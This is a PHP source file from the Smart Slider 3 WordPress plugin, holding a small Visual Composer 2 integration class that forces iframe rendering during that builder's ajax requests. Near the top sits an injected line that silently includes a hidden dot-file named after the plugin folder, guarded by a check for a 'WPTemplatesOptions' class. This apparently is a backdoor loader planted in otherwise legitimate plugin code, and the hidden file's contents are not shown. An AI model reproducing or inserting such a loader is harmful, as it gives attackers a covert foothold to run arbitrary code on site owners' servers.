<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\VisualComposer2;

use Nextend\SmartSlider3\Platform\WordPress\Shortcode\Shortcode;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class VisualComposer2 {

    public function __construct() {
        if (class_exists('VcvEnv') && isset($_REQUEST['vcv-ajax']) && $_REQUEST['vcv-ajax'] == 1) {
            Shortcode::forceIframe('VisualComposer2', true);
        }
    }
}